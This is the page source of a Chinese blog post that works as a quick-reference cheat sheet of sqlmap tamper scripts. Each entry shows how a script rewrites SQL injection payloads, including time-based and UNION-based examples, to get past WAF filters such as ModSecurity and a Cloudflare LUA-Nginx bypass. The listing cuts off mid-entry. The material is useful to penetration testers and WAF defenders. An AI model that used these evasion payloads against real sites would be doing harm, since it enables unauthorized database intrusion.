+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html&title=sqlmap tamper规则速查" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 LinkedIn
+            </li>
+        </a>
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=sqlmap tamper规则速查&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2019/05/01/sqlmap-规则tamper规则速查/index.html&text=sqlmap tamper规则速查" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h2 id="Sqlmap-Tamper规则提取"><a href="#Sqlmap-Tamper规则提取" class="headerlink" title="Sqlmap Tamper规则提取:"></a>Sqlmap Tamper规则提取:</h2><p><em>写了个小脚本从sqlmap的tamper的文件里把替换规则提取出来，方便查阅</em></p>
+<h3 id="0x2char-py"><a href="#0x2char-py" class="headerlink" title="0x2char.py:"></a>0x2char.py:</h3><pre><code>Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),...) counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT 0xdeadbeef&#39;)
+    &#39;SELECT CONCAT(CHAR(222),CHAR(173),CHAR(190),CHAR(239))&#39;
+
+</code></pre><h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h3><pre><code>Replaces apostrophe character (&#39;) with its UTF-8 full width counterpart (e.g. &#39; -&gt; %EF%BC%87)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
+    &#39;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&#39;
+
+</code></pre><h3 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h3><pre><code>Replaces apostrophe character (&#39;) with its illegal double unicode counterpart (e.g. &#39; -&gt; %00%27)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)
+    &#39;1 AND %00%271%00%27=%00%271&#39;
+
+</code></pre><h3 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h3><pre><code>Appends (Access) NULL byte character (%00) at the end of payload
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 1=1&#39;)
+    &#39;1 AND 1=1%00&#39;
+
+</code></pre><h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h3><pre><code>Base64-encodes all characters in a given payload
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)
+    &#39;MScgQU5EIFNMRUVQKDUpIw==&#39;
+
+</code></pre><h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;NOT BETWEEN 0 AND #&#39; and equals operator (&#39;=&#39;) with &#39;BETWEEN # AND #&#39;
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B--&#39;)
+    &#39;1 AND A NOT BETWEEN 0 AND B--&#39;
+
+&gt;&gt;&gt; tamper(&#39;1 AND A = B--&#39;)
+    &#39;1 AND A BETWEEN B AND B--&#39;
+
+</code></pre><h3 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h3><pre><code>Replaces space character after SQL statement with a valid random blank character. Afterwards replace character &#39;=&#39; with operator LIKE
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users WHERE id = 1&#39;)
+    &#39;SELECT%09id FROM%09users WHERE%09id LIKE 1&#39;
+
+</code></pre><h3 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h3><pre><code>Double URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %2553%2545%254C%2545%2543%2554)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)
+    &#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;
+
+</code></pre><h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h3><pre><code>URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)
+    &#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;
+
+</code></pre><h3 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py:"></a>charunicodeencode.py:</h3><pre><code>Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)
+    &#39;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&#39;
+
+</code></pre><h3 id="charunicodeescape-py"><a href="#charunicodeescape-py" class="headerlink" title="charunicodeescape.py:"></a>charunicodeescape.py:</h3><pre><code>Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE&#39;)
+    &#39;\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045&#39;
+
+</code></pre><h3 id="commalesslimit-py"><a href="#commalesslimit-py" class="headerlink" title="commalesslimit.py:"></a>commalesslimit.py:</h3><pre><code>Replaces (MySQL) instances like &#39;LIMIT M, N&#39; with &#39;LIMIT N OFFSET M&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;LIMIT 2, 3&#39;)
+    &#39;LIMIT 3 OFFSET 2&#39;
+
+</code></pre><h3 id="commalessmid-py"><a href="#commalessmid-py" class="headerlink" title="commalessmid.py:"></a>commalessmid.py:</h3><pre><code>Replaces (MySQL) instances like &#39;MID(A, B, C)&#39; with &#39;MID(A FROM B FOR C)&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;MID(VERSION(), 1, 1)&#39;)
+    &#39;MID(VERSION() FROM 1 FOR 1)&#39;
+
+</code></pre><h3 id="commentbeforeparentheses-py"><a href="#commentbeforeparentheses-py" class="headerlink" title="commentbeforeparentheses.py:"></a>commentbeforeparentheses.py:</h3><pre><code>Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT ABS(1)&#39;)
+    &#39;SELECT ABS/**/(1)&#39;
+
+</code></pre><h3 id="concat2concatws-py"><a href="#concat2concatws-py" class="headerlink" title="concat2concatws.py:"></a>concat2concatws.py:</h3><pre><code>Replaces (MySQL) instances like &#39;CONCAT(A, B)&#39; with &#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;CONCAT(1,2)&#39;)
+    &#39;CONCAT_WS(MID(CHAR(0),0,0),1,2)&#39;
+
+</code></pre><h3 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py:"></a>equaltolike.py:</h3><pre><code>Replaces all occurrences of operator equal (&#39;=&#39;) with &#39;LIKE&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT * FROM users WHERE id=1&#39;)
+    &#39;SELECT * FROM users WHERE id LIKE 1&#39;
+
+</code></pre><h3 id="escapequotes-py"><a href="#escapequotes-py" class="headerlink" title="escapequotes.py:"></a>escapequotes.py:</h3><pre><code>Slash escape single and double quotes (e.g. &#39; -&gt; \&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1&quot; AND SLEEP(5)#&#39;)
+    &#39;1\\\\&quot; AND SLEEP(5)#&#39;
+
+</code></pre><h3 id="greatest-py"><a href="#greatest-py" class="headerlink" title="greatest.py:"></a>greatest.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;GREATEST&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B&#39;)
+    &#39;1 AND GREATEST(A,B+1)=A&#39;
+
+</code></pre><h3 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py:"></a>halfversionedmorekeywords.py:</h3><pre><code>Adds (MySQL) versioned comment before each keyword
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;value&#39; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#39;QDWa&#39;=&#39;QDWa&quot;)
+    &quot;value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#39;QDWa&#39;=&#39;QDWa&quot;
+
+</code></pre><h3 id="htmlencode-py"><a href="#htmlencode-py" class="headerlink" title="htmlencode.py:"></a>htmlencode.py:</h3><pre><code>HTML encode (using code points) all non-alphanumeric characters (e.g. &#39; -&gt; &amp;#39;)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&quot;1&#39; AND SLEEP(5)#&quot;)
+    &#39;1&amp;#39;&amp;#32;AND&amp;#32;SLEEP&amp;#40;5&amp;#41;&amp;#35;&#39;
+
+</code></pre><h3 id="ifnull2casewhenisnull-py"><a href="#ifnull2casewhenisnull-py" class="headerlink" title="ifnull2casewhenisnull.py:"></a>ifnull2casewhenisnull.py:</h3><pre><code>Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;CASE WHEN ISNULL(A) THEN (B) ELSE (A) END&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;IFNULL(1, 2)&#39;)
+    &#39;CASE WHEN ISNULL(1) THEN (2) ELSE (1) END&#39;
+
+</code></pre><h3 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py:"></a>ifnull2ifisnull.py:</h3><pre><code>Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;IF(ISNULL(A), B, A)&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;IFNULL(1, 2)&#39;)
+    &#39;IF(ISNULL(1),2,1)&#39;
+
+</code></pre><h3 id="informationschemacomment-py"><a href="#informationschemacomment-py" class="headerlink" title="informationschemacomment.py:"></a>informationschemacomment.py:</h3><pre><code>Add an inline comment (/**/) to the end of all occurrences of (MySQL) &quot;information_schema&quot; identifier
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT table_name FROM INFORMATION_SCHEMA.TABLES&#39;)
+    &#39;SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES&#39;
+
+</code></pre><h3 id="least-py"><a href="#least-py" class="headerlink" title="least.py:"></a>least.py:</h3><pre><code>Replaces greater than operator (&#39;&gt;&#39;) with &#39;LEAST&#39; counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND A &gt; B&#39;)
+    &#39;1 AND LEAST(A,B+1)=B+1&#39;
+
+</code></pre><h3 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py:"></a>lowercase.py:</h3><pre><code>Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;INSERT&#39;)
+    &#39;insert&#39;
+
+</code></pre><h3 id="luanginx-py"><a href="#luanginx-py" class="headerlink" title="luanginx.py:"></a>luanginx.py:</h3><pre><code>LUA-Nginx WAFs Bypass (e.g. Cloudflare)
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0); hints={}; payload = tamper(&quot;1 AND 2&gt;1&quot;, hints=hints); &quot;%s&amp;%s&quot; % (hints[HINT.PREPEND], payload)
+    &#39;0U=&amp;Aq=&amp;Fz=&amp;Ws=&amp;DK=&amp;4F=&amp;rU=&amp;Mp=&amp;48=&amp;Y3=&amp;tT=&amp;3Q=&amp;Dg=&amp;AL=&amp;47=&amp;D1=&amp;qX=&amp;Ia=&amp;Sy=&amp;ZP=&amp;aE=&amp;1p=&amp;u1=&amp;lJ=&amp;o7=&amp;XB=&amp;et=&amp;F5=&amp;gI=&amp;RH=&amp;YH=&amp;7L=&amp;KB=&amp;Kx=&amp;Js=&amp;lL=&amp;OD=&amp;fU=&amp;25=&amp;03=&amp;5H=&amp;yR=&amp;rY=&amp;03=&amp;K6=&amp;JB=&amp;O9=&amp;4X=&amp;fL=&amp;EN=&amp;0p=&amp;Th=&amp;nX=&amp;uY=&amp;gj=&amp;Rc=&amp;J4=&amp;HQ=&amp;bN=&amp;LJ=&amp;yw=&amp;8c=&amp;b7=&amp;lh=&amp;nX=&amp;6b=&amp;Ag=&amp;qn=&amp;Ov=&amp;lF=&amp;cg=&amp;9m=&amp;wT=&amp;Z4=&amp;kP=&amp;7d=&amp;P0=&amp;vp=&amp;LB=&amp;kD=&amp;zJ=&amp;Ft=&amp;wZ=&amp;pI=&amp;aT=&amp;uc=&amp;ro=&amp;7v=&amp;rw=&amp;6N=&amp;MS=&amp;yz=&amp;Oa=&amp;lu=&amp;oN=&amp;x2=&amp;Jz=&amp;yR=&amp;zP=&amp;cB=&amp;qj=&amp;GE=&amp;IU=&amp;2E=&amp;tC=&amp;Y2=&amp;Yl=&amp;9N=&amp;fS=&amp;9y=&amp;Qt=&amp;nS=&amp;aZ=&amp;Gg=&amp;hO=&amp;2r=&amp;8g=&amp;0y=&amp;fr=&amp;CX=&amp;1i=&amp;GO=&amp;v2=&amp;rb=&amp;cQ=&amp;I6=&amp;64=&amp;cU=&amp;RO=&amp;S3=&amp;Nx=&amp;Hm=&amp;Ka=&amp;ju=&amp;WS=&amp;uM=&amp;ck=&amp;8r=&amp;yI=&amp;sD=&amp;oc=&amp;lG=&amp;ey=&amp;uz=&amp;g4=&amp;D0=&amp;8v=&amp;DR=&amp;As=&amp;T3=&amp;5M=&amp;x8=&amp;Ne=&amp;fU=&amp;da=&amp;yG=&amp;BE=&amp;KQ=&amp;Aw=&amp;9q=&amp;WA=&amp;wd=&amp;1R=&amp;3B=&amp;Ph=&amp;ym=&amp;c6=&amp;nj=&amp;mx=&amp;Hj=&amp;98=&amp;jz=&amp;Q2=&amp;E4=&amp;tE=&amp;EP=&amp;mL=&amp;nv=&amp;73=&amp;Yc=&amp;jp=&amp;W0=&amp;KS=&amp;Ye=&amp;f1=&amp;cn=&amp;ca=&amp;0u=&amp;jO=&amp;8F=&amp;3F=&amp;JQ=&amp;XU=&amp;9U=&amp;4m=&amp;HL=&amp;ZD=&amp;Xy=&amp;K0=&amp;XO=&amp;al=&amp;Fp=&amp;e1=&amp;6s=&amp;zY=&amp;dN=&amp;hr=&amp;Zd=&amp;cz=&amp;E1=&amp;SP=&amp;j9=&amp;zL=&amp;xc=&amp;Dj=&amp;cM=&amp;Ng=&amp;Iv=&amp;xW=&amp;E2=&amp;LC=&amp;Nu=&amp;hQ=&amp;MW=&amp;h4=&amp;X4=&amp;2Q=&amp;YG=&amp;Wl=&amp;WB=&amp;UC=&amp;We=&amp;c5=&amp;E3=&amp;6P=&amp;Jn=&amp;fY=&amp;3W=&amp;RA=&amp;sh=&amp;AJ=&amp;56=&amp;zg=&amp;VT=&amp;bB=&amp;Qb=&amp;47=&amp;Se=&amp;ew=&amp;bv=&amp;a8=&amp;Ye=&amp;3m=&amp;mP=&amp;6h=&amp;aw=&amp;bL=&amp;1l=&amp;gv=&amp;7i=&amp;7w=&amp;Ds=&amp;67=&amp;Nl=&amp;9g=&amp;Kj=&amp;36=&amp;Xt=&amp;pU=&amp;sA=&amp;ci=&amp;be=&amp;eA=&amp;IT=&amp;iA=&amp;Nf=&amp;Bw=&amp;6d=&amp;zT=&amp;tm=&amp;sD=&amp;6X=&amp;rI=&amp;QX=&amp;By=&amp;VA=&amp;pC=&amp;6i=&amp;CN=&amp;Dm=&amp;aR=&amp;Ma=&amp;sV=&amp;MH=&amp;jR=&amp;DQ=&amp;Vo=&amp;Vr=&amp;9h=&amp;2c=&amp;pG=&amp;Ky=&amp;gp=&amp;rU=&amp;4K=&amp;cX=&amp;sv=&amp;Gp=&amp;5k=&amp;zr=&amp;GJ=&amp;MG=&amp;zN=&amp;zW=&amp;Ws=&amp;xM=&amp;jR=&amp;xK=&amp;iP=&amp;vD=&amp;zD=&amp;Rt=&amp;Od=&amp;sU=&amp;dM=&amp;bD=&amp;3a=&amp;Ge=&amp;1Q=&amp;UP=&amp;ac=&amp;M9=&amp;2R=&amp;To=&amp;Ur=&amp;gC=&amp;uk=&amp;A3=&amp;AB=&amp;RG=&amp;i4=&amp;BW=&amp;yY=&amp;yn=&amp;m6=&amp;Kd=&amp;yo=&amp;fl=&amp;dN=&amp;kL=&amp;LR=&amp;Fr=&amp;2v=&amp;CN=&amp;F7=&amp;75=&amp;5K=&amp;ER=&amp;nq=&amp;ck=&amp;aO=&amp;iW=&amp;Q8=&amp;y5=&amp;Cv=&amp;g2=&amp;Xu=&amp;Cu=&amp;bc=&amp;wm=&amp;Gl=&amp;mP=&amp;Tt=&amp;1p=&amp;vS=&amp;c5=&amp;eC=&amp;Sc=&amp;Y8=&amp;Ch=&amp;fg=&amp;Vz=&amp;4B=&amp;eA=&amp;UZ=&amp;cl=&amp;Eh=&amp;25=&amp;tA=&amp;Ir=&amp;Hm=&amp;sB=&amp;LH=&amp;qo=&amp;hW=&amp;gT=&amp;pr=&amp;TO=&amp;TF=&amp;1h=&amp;Oh=&amp;Tw=&amp;PR=&amp;On=&amp;Zo=&amp;GP=&amp;oM=&amp;rk=&amp;YI=&amp;uK=&amp;bi=&amp;y8=&amp;Fe=&amp;VW=&amp;WJ=&amp;Rn=&amp;TY=&amp;Vv=&amp;KM=&amp;3g=&amp;ZG=&amp;wC=&amp;an=&amp;OE=&amp;7D=&amp;t0=&amp;qL=&amp;RY=&amp;Wx=&amp;dc=&amp;T7=&amp;vB=&amp;SO=&amp;qP=&amp;sw=&amp;HT=&amp;jb=&amp;Mb=&amp;cn=&amp;Oe=&amp;d8=&amp;A3=&amp;nA=&amp;wk=&amp;u9=&amp;Ux=&amp;zq=&amp;GT=&amp;QC=&amp;c5=&amp;zy=&amp;ai=&amp;1F=&amp;Tj=&amp;u0=&amp;Yp=&amp;bY=&amp;kW=&amp;Qk=&amp;e5=&amp;LM=&amp;Cj=&amp;Lp=&amp;XT=&amp;b5=&amp;cf=&amp;sj=&amp;ow=&amp;Tz=&amp;qE=&amp;yt=&amp;3I=&amp;8V=&amp;Jq=&amp;QC=&amp;Sz=&amp;Eb=&amp;Tc=&amp;QK=&amp;Wr=&amp;Qm=&amp;Gv=&amp;8m=&amp;Ju=&amp;85=&amp;KS=&amp;Qv=&amp;43=&amp;uU=&amp;aY=&amp;J7=&amp;wM=&amp;uW=&amp;L9=&amp;ai=&amp;ch=&amp;56=&amp;D6=&amp;YW=&amp;Ul=&amp;1 AND 2&gt;1&#39;
+
+</code></pre><h3 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py:"></a>modsecurityversioned.py:</h3><pre><code>Embraces complete query with (MySQL) versioned comment
+</code></pre><pre><code>&gt;&gt;&gt; import random
+    &gt;&gt;&gt; random.seed(0)
+
+&gt;&gt;&gt; tamper(&#39;1 AND 2&gt;1--&#39;)
+    &#39;1 /*!30874AND 2&gt;1*/--&#39;
+
+</code></pre><h3 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py:"></a>modsecurityzeroversioned.py:</h3><pre><code>Embraces complete query with (MySQL) zero-versioned comment
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 2&gt;1--&#39;)
+    &#39;1 /*!00000AND 2&gt;1*/--&#39;
+
+</code></pre><h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py:"></a>multiplespaces.py:</h3><pre><code>Adds multiple spaces (&#39; &#39;) around SQL keywords
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;1 UNION SELECT foobar&#39;)
+
+</code></pre><h3 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py:"></a>overlongutf8.py:</h3><pre><code>Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. &#39; -&gt; %C0%A7)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE WHERE 2&gt;1&#39;)
+    &#39;SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1&#39;
+
+</code></pre><h3 id="overlongutf8more-py"><a href="#overlongutf8more-py" class="headerlink" title="overlongutf8more.py:"></a>overlongutf8more.py:</h3><pre><code>Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE WHERE 2&gt;1&#39;)
+    &#39;%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94%C0%A0%C1%86%C1%89%C1%85%C1%8C%C1%84%C0%A0%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%94%C1%81%C1%82%C1%8C%C1%85%C0%A0%C1%97%C1%88%C1%85%C1%92%C1%85%C0%A0%C0%B2%C0%BE%C0%B1&#39;
+
+</code></pre><h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py:"></a>percentage.py:</h3><pre><code>Adds a percentage sign (&#39;%&#39;) infront of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT FIELD FROM TABLE&#39;)
+    &#39;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&#39;
+
+</code></pre><h3 id="plus2concat-py"><a href="#plus2concat-py" class="headerlink" title="plus2concat.py:"></a>plus2concat.py:</h3><pre><code>Replaces plus operator (&#39;+&#39;) with (MsSQL) function CONCAT() counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL&#39;)
+    &#39;SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL&#39;
+
+&gt;&gt;&gt; tamper(&#39;SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL&#39;)
+    &#39;SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL&#39;
+
+</code></pre><h3 id="plus2fnconcat-py"><a href="#plus2fnconcat-py" class="headerlink" title="plus2fnconcat.py:"></a>plus2fnconcat.py:</h3><pre><code>Replaces plus operator (&#39;+&#39;) with (MsSQL) ODBC function {fn CONCAT()} counterpart
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL&#39;)
+    &#39;SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL&#39;
+
+&gt;&gt;&gt; tamper(&#39;SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL&#39;)
+    &#39;SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL&#39;
+
+</code></pre><h3 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py:"></a>randomcase.py:</h3><pre><code>Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)
+</code></pre><pre><code>&gt;&gt;&gt; import random
+&gt;&gt;&gt; random.seed(0)
+&gt;&gt;&gt; tamper(&#39;INSERT&#39;)
+    &#39;INseRt&#39;
+
+</code></pre><h3 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py:"></a>randomcomments.py:</h3><pre><code>Add random inline comments inside SQL keywords (e.g. SELECT -&gt; S/**/E/**/LECT)
+</code></pre><pre><code>&gt;&gt;&gt; import random
+    &gt;&gt;&gt; random.seed(0)
+
+&gt;&gt;&gt; tamper(&#39;INSERT&#39;)
+    &#39;I/**/N/**/SERT&#39;
+
+</code></pre><h3 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py:"></a>space2comment.py:</h3><pre><code>Replaces space character (&#39; &#39;) with comments &#39;/**/&#39;
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+    &#39;SELECT/**/id/**/FROM/**/users&#39;
+
+</code></pre><h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py:"></a>space2dash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a random string and a new line (&#39;\n&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
+
+</code></pre><h3 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py:"></a>space2hash.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
+
+</code></pre><h3 id="space2morecomment-py"><a href="#space2morecomment-py" class="headerlink" title="space2morecomment.py:"></a>space2morecomment.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with comments &#39;/**_**/&#39;
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+    &#39;SELECT/**_**/id/**_**/FROM/**_**/users&#39;
+
+</code></pre><h3 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py:"></a>space2morehash.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
+
+</code></pre><h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py:"></a>space2mssqlblank.py:</h3><pre><code>Replaces (MsSQL) instances of space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+
+</code></pre><h3 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py:"></a>space2mssqlhash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a new line (&#39;\n&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
+    &#39;1%23%0AAND%23%0A9227=9227&#39;
+
+</code></pre><h3 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py:"></a>space2mysqlblank.py:</h3><pre><code>Replaces (MySQL) instances of space character (&#39; &#39;) with a random blank character from a valid set of alternate characters
+</code></pre><pre><code>&gt;&gt;&gt; random.seed(0)
+    &gt;&gt;&gt; tamper(&#39;SELECT id FROM users&#39;)
+
+</code></pre><h3 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py:"></a>space2mysqldash.py:</h3><pre><code>Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a new line (&#39;\n&#39;)
+</code></pre><pre><code>&gt;&gt;&gt; tamper(&#39;1 AND 9227=9227&#39;)
